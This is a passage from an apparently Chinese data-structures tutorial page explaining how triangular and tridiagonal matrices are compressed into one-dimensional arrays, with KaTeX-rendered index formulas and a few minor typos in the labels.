<code>1</code> 开始的</p>
</div>
</li>
<li>
<p><strong>三角矩阵</strong></p>
<p>下三角矩阵中，上三角区的所有元素均为同一常量。其存储思想与对称矩阵类似，不同之处在于存储完下三角区和主对角线上的元素之后，紧接着存储对角线上方的常量一次，故可以将 <code>n</code> 阶下三角矩阵 <code>A</code> 压缩存储在 <code>B[n(n + l) / 2 + 1]</code> 中。</p>
<p>元素下标之间的对应关系为：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>k</mi><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mi>i</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac></mstyle><mo>+</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mo>⩾</mo><mi>j</mi><mo stretchy="false">(</mo><mtext>下三角区和主对角线元素</mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac></mstyle><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mo>&lt;</mo><mi>j</mi><mo stretchy="false">(</mo><mtext>上三角区元素</mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">
k = \begin{cases}
  \dfrac{i(i - 1)}{2} + j - 1, &amp; i \geqslant j(\text{下三角区和主对角线元素}) \\
  \dfrac{n(n + 1)}{2}, &amp; i &lt; j(\text{上三角区元素})
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:4.226em;vertical-align:-1.863em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35em;"><span style="top:-2.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.192em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-4.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.85em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.363em;"><span style="top:-4.363em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.863em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.363em;"><span style="top:-4.363em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">下三角区和主对角线元素</span></span><span class="mclose">)</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">上三角区元素</span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.863em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>上三角矩阵中，下三角区的所有元素均为同一常量。只需存储主对角线、上三角区上的元素和下三角区的常量一次，可将其压缩存储在 <code>B[n(n + l) / 2 + 1]</code> 中。</p>
<p>在数组 <code>B</code> 中，位于元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo stretchy="false">(</mo><mi>i</mi><mo>⩾</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_{i,j} (i \geqslant j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span> 前面的元素个数为：</p>
<ul>
<li>第 1 行：n 个元素</li>
<li>第 2 行：n - 1 个元素</li>
<li>……</li>
<li>第 i - 1 行：n - i + 2 个元素</li>
<li>第 i 行：j - i 个元素</li>
</ul>
<p>因此，元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">a_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 在数组 <code>B</code> 中的下标 <code>k = n + (n - 1) + … + (n - i + 2) + (j - i + 1) - 1 = (i - 1)(2n - i + 2) / 2 + (j - i)</code>。因此，元素下标之间的对应关系如下：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>k</mi><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>2</mn><mi>n</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>2</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac></mstyle><mo>+</mo><mo stretchy="false">(</mo><mi>j</mi><mo>−</mo><mi>i</mi><mo stretchy="false">)</mo><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mo>⩽</mo><mi>j</mi><mo stretchy="false">(</mo><mtext>下三角区和主对角线元素</mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mstyle displaystyle="true" scriptlevel="0"><mfrac><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac></mstyle><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mo>&gt;</mo><mi>j</mi><mo stretchy="false">(</mo><mtext>上三角区元素</mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">
k = \begin{cases}
  \dfrac{(i - 1)(2n - i + 2)}{2} + (j - i), &amp; i \leqslant j(\text{下三角区和主对角线元素}) \\
  \dfrac{n(n + 1)}{2}, &amp; i &gt; j(\text{上三角区元素})
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:4.226em;vertical-align:-1.863em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35em;"><span style="top:-2.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.192em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.316em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.316em" style="width:0.8889em" viewBox="0 0 888.89 316" preserveAspectRatio="xMinYMin"><path d="M384 0 H504 V316 H384z M384 0 H504 V316 H384z"></path></svg></span></span><span style="top:-4.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.85em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.363em;"><span style="top:-4.363em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">2</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.863em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.363em;"><span style="top:-4.363em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">下三角区和主对角线元素</span></span><span class="mclose">)</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.427em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">上三角区元素</span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.863em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>以上推导均假设数组的下标从 <code>0</code> 开始。</p>
</li>
<li>
<p><strong>三对角矩阵</strong></p>
<p>对角矩阵也称带状矩阵。对于 <code>n</code> 阶矩阵 <code>A</code> 中的任意一个元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">a_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，当 <code>|i - j| &gt; 1</code> 时，有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo>=</mo><mn>0</mn><mo stretchy="false">(</mo><mn>1</mn><mo>⩽</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>⩽</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_{i,j} = 0 (1 \leqslant i, j \leqslant n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，则称为 <strong>三对角矩阵</strong>。在三对角矩阵中，所有非零元素都集中在以主对角线为中心的 <code>3</code> 条对角线的区域，其他区域的元素都为零。</p>
<p>三对角矩阵 <code>A</code> 也可以采用压缩存储，将 <code>3</code> 条对角线上的元素按行优先方式存放在一维数组 <code>B</code> 中，且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mn>1</mn><mo separator="true">,</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">a_{1,1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 存放于 <code>B[0]</code> 中。</p>
<p>由此可以计算矩阵 <code>A</code> 中 <code>3</code> 条对角线上的元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><mo stretchy="false">(</mo><mn>1</mn><mo>⩽</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>⩽</mo><mi>n</mi><mo separator="true">,</mo><mi mathvariant="normal">∣</mi><mi>i</mi><mo>−</mo><mi>j</mi><mi mathvariant="normal">∣</mi><mo>⩽</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a_{i,j}(1 \leqslant i, j \leqslant n, |i - j| \leqslant 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∣</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 在一维数组 <code>B</code> 中存放的下标为 <code>k = 2i + j - 3</code>。</p>
<p>反之，若已知三对角线矩阵中某元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">a_{i,j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 存放于一维数组 <code>B</code> 的第 <code>k</code> 个位置，则可得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mo stretchy="false">⌊</mo><mo stretchy="false">(</mo><mi>k</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>3</mn><mo>+</mo><mn>1</mn><mo stretchy="false">⌋</mo><mo separator="true">,</mo><mi>j</mi><mo>=</mo><mi>k</mi><mo>−</mo><mn>2</mn><mi>i</mi><mo>+</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">i = \lfloor (k + 1) / 3 + 1 \rfloor, j = k - 2i + 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">/3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">⌋</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span>。例如，当 <code>k = 0</code> 时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mo stretchy="false">⌊</mo><mo stretchy="false">(</mo><mn>0</mn><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>3</mn><mo>+</mo><mn>1</mn><mo 